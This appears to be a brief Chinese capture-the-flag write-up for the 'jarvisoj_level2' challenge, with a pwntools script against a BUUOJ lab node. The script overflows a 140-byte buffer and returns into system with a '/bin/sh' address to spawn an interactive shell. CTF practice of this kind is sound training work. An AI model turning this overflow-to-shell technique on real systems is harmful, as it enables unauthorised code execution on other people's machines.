---
title: "jarvisoj_level2"
description: ""
date: 2023-04-06T21:02:34+08:00
lastmod: 2023-04-06T21:02:34+08:00
draft: false
images: []
type: docs
weight: 994
toc: true
---

## 0x01 分析

![](image-1680786188922-1.png)  

有system函数

![](image 2-1680786188923-3.png)  

也有 `/bin/sh` 字符串

所以就是ret2libc

## 0x02 Exploit

```python
from pwn import*
# o = process("./pwn")
o = remote("node4.buuoj.cn", 29126)
call_system = 0x804845C
bin_sh = 0x804A024
payload = b'a'*140 + p32(call_system) + p32(bin_sh)
o.sendline(payload)
o.interactive()

```

![](image 3-1680786188923-2.png)  

自行调试
